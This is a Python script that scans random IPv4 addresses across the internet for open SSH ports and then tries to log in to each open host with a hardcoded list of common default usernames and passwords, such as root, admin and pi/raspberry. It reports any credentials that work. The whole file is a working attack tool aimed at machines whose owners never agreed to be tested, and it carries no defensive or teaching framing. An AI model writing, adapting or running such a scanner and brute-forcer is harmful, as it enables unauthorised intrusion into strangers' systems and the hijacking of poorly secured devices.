import random
import socket
from colorama import Fore
import paramiko
import sys
import time

def generateip():
    ip = f"{random.randrange(1, 255)}.{random.randrange(0, 255)}.{random.randrange(0, 255)}.{random.randrange(0, 255)}"
    #ip = "51.195.149.18"
    return ip

count = 0

def checkport():
    global count
    while True:
        ip = generateip()
        try:
            s = socket.socket()
            s.settimeout(0.2)
            s.connect((ip, 22))
        except KeyboardInterrupt:
            print(Fore.WHITE + f"Scanned: {count}")
            sys.exit()          
        except:
            print(Fore.RED + ip, "closed")
            count += 1
        else:
            print(Fore.GREEN + ip, "open")
            count += 1
            print(Fore.WHITE + f"Scanned: {count}")
            return ip

def login():
    global count
    ip = checkport()
    usernames = "root", "admin", "pi", "user", "test", "ubuntu", "support", "guest", "ubnt", "1234", "ftp", "hadoop"
    passwords = "root", "admin", "raspberry", "user", "test", "ubuntu", "pi", "support", "guest", "ubnt", "1234", "ftp", "hadoop", "123456", "Qwerty", "Password", ""
    time.sleep(0.5)
    for username in usernames:
        for password in passwords:
            try:
                client = paramiko.client.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=username, password=password)
            except ConnectionError:
                login()
            except KeyboardInterrupt:
                print(Fore.WHITE + f"Scanned: {count}")
                sys.exit()
            except (ConnectionResetError, EOFError):
                client.close()
            except:
                print(Fore.RED + f"FAILED:{Fore.WHITE} ip:{ip} username:{username} password:{password}")
                client.close()
            else:
                sys.exit(Fore.GREEN + f"SUCCESS:{Fore.WHITE} ip:{ip} username:{username} password:{password}")
    login()    

login()
